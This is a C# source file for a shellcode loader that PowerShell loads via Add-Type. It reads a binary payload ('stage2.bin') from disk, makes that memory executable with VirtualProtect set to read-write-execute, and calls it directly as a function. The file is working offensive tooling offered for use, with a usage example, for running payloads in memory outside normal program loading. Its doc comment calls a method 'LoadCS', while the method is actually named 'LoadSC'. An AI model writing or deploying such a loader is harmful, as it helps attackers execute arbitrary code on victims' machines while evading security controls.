/// <summary>
/// Load shellcode/PE via solstice's stage2.bin (PE Loader shellcode)
/// 
/// Examples
/// 
/// ```
/// Add-Type -Path sc.cs
/// [ShellCodeLoader]::LoadCS("D:\sc\stage2.bin", "D:\sc\daemon.exe", "")
/// ```
/// </summary>

public static class ShellCodeLoader
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
    public struct ShellcodeArgs
    {
        public string ImageName;
        public string Args;
    }

    [Flags]
    public enum PageProtection : uint
    {
        PAGE_EXECUTE = 0x10,
        PAGE_EXECUTE_READ = 0x20,
        PAGE_EXECUTE_READWRITE = 0x40,
        PAGE_EXECUTE_WRITECOPY = 0x80,
        PAGE_NOACCESS = 0x01,
        PAGE_READONLY = 0x02,
        PAGE_READWRITE = 0x04,
        PAGE_WRITECOPY = 0x08,
        PAGE_TARGETS_INVALID = 0x40000000,
        PAGE_TARGETS_NO_UPDATE = 0x40000000,
        PAGE_GUARD = 0x100,
        PAGE_NOCACHE = 0x200,
        PAGE_WRITECOMBINE = 0x400
    }

    [DllImport("kernelbase.dll", SetLastError = true, ExactSpelling = true, CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, PageProtection flNewProtect, out PageProtection lpflOldProtect);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    internal delegate void ShellCodeCaller(ShellcodeArgs args);

    public static int Invoke(byte[] sc, string executablePath, string args)
    {
        unsafe
        {
            fixed (void* ptr = &sc[0])
            {
                PageProtection flOld;
                VirtualProtect((IntPtr)ptr, (uint)sc.Length, PageProtection.PAGE_EXECUTE_READWRITE, out flOld);

                var scArgs = new ShellcodeArgs()
                {
                    ImageName = executablePath,
                    Args = args,
                };

                ShellCodeCaller s = (ShellCodeCaller)Marshal.GetDelegateForFunctionPointer((IntPtr)ptr, typeof(ShellCodeCaller));
                s(scArgs);
            }
        }

        return 0;
    }

    public static int LoadSC(string shellcodepath, string executablePath, string args)
    {
        var sc = File.ReadAllBytes(shellcodepath);
        return Invoke(sc, executablePath, args);
    }
}